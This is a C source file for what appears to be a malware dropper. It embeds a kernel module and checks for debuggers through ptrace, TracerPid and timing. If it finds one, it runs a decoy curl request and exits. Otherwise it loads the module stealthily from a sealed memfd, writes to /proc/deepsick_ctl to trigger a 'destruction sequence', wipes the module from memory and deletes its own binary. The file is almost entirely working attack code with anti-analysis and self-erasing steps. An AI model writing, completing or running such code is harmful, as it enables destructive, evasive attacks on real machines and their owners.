#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/memfd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <openssl/sha.h>

#define MODULE_SIZE_MAX (5 * 1024 * 1024) // 5MB

extern unsigned char _binary_module_ko_start[];
extern unsigned char _binary_module_ko_end[];

// Advanced debugger detection
int detect_debugger() {
    // 1. Ptrace check
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return 1;
    }

    // 2. /proc/self/status check
    FILE *status = fopen("/proc/self/status", "r");
    if (status) {
        char line[256];
        while (fgets(line, sizeof(line), status)) {
            if (strstr(line, "TracerPid:") && atoi(strchr(line, ':') + 1) != 0) {
                fclose(status);
                return 1;
            }
        }
        fclose(status);
    }

    // 3. Timing check
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    getpid(); // Simple syscall
    clock_gettime(CLOCK_MONOTONIC, &end);
    long elapsed = (end.tv_sec - start.tv_sec) * 1000000000 + (end.tv_nsec - start.tv_nsec);
    if (elapsed > 1000000) { // 1ms threshold
        return 1;
    }

    return 0;
}

// Secure memory wipe
void secure_wipe(void *ptr, size_t size) {
    if (ptr == NULL) return;
    
    volatile unsigned char *p = ptr;
    while (size--) {
        *p++ = 0;
        asm volatile("" ::: "memory"); // Prevent optimization
    }
}

// Stealth module loading
int load_module_stealth(const void *data, size_t size) {
    int fd = syscall(SYS_memfd_create, "kernel_temp", MFD_CLOEXEC | MFD_ALLOW_SEALING);
    if (fd < 0) {
        perror("memfd_create failed");
        return -1;
    }

    if (write(fd, data, size) != size) {
        perror("write failed");
        close(fd);
        return -1;
    }

    // Seal the file
    fcntl(fd, F_ADD_SEALS, F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE | F_SEAL_SEAL);

    char path[32];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    
    if (syscall(SYS_finit_module, fd, "", 0) < 0) {
        perror("finit_module failed");
        close(fd);
        return -1;
    }

    close(fd);
    return 0;
}

int main(int argc, char *argv[]) {
    if (detect_debugger()) {
        // Decoy activity
        system("curl -s https://api.example.com/update > /dev/null");
        exit(0);
    }

    size_t mod_size = (size_t)(_binary_module_ko_end - _binary_module_ko_start);
    if (mod_size == 0 || mod_size > MODULE_SIZE_MAX) {
        exit(1);
    }

    if (load_module_stealth(_binary_module_ko_start, mod_size)) {
        exit(1);
    }

    // Activate destruction sequence
    int fd = open("/proc/deepsick_ctl", O_WRONLY);
    if (fd >= 0) {
        write(fd, "1", 1);
        close(fd);
    }

    // Cleanup
    secure_wipe(_binary_module_ko_start, mod_size);
    unlink(argv[0]); // Self-delete
    
    return 0;
}
